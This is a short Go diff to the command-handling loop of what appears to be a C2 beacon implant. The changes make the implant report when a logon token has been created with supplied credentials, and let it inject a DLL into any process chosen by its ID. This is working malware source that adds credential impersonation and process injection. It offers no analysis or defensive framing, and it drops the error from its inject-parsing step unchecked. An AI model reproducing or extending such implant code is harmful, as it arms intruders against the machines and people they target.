@@ -115,6 +115,11 @@ func main() {
 									break
 								}
 								execErr = command.MakeToken(domain, username, password)
+								if execErr != nil {
+									break
+								}
+								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte("Make token success"))
+								packet.PushResult(finalPacket)
 							// TODO have no idea about how to deal with token
 							case command.CMD_TYPE_SPAWN_TOKEN_X64:
 								fallthrough
@@ -125,9 +130,12 @@ func main() {
 							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X86:
 								execErr = command.SpawnAndInjectDllX86(cmdBuf)
 							case command.CMD_TYPE_INJECT_X86:
-								execErr = command.InjectDllSelfX86(cmdBuf)
+								fallthrough
 							case command.CMD_TYPE_INJECT_X64:
-								execErr = command.InjectDllSelfX64(cmdBuf)
+								var pid uint32
+								var dll []byte
+								pid, dll, execErr = command.ParseInject(cmdBuf)
+								execErr = command.InjectDll(pid, dll)
 							case command.CMD_TYPE_JOB:
 								execErr = command.HandlerJob(cmdBuf)
 							case command.CMD_TYPE_GET_UID:
